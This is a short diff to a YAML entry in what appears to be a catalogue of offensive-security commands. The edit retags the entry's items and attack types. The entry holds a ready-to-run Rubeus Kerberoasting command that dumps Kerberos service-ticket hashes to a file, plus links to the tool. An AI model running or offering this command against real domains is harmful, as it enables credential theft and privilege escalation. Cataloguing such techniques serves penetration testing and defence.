@@ -9,14 +9,14 @@ description: |
 command: |
   Rubeus.exe kerberoast /outfile:hashes.txt
 items:
-  - Password
-  - Username
+  - Shell
 services:
   - Kerberos
 OS:
   - Windows
 attack_types:
   - Exploitation
+  - PrivEsc
 references:
   - https://github.com/GhostPack/Rubeus
   - https://github.com/GhostPack/Rubeus#kerberoast
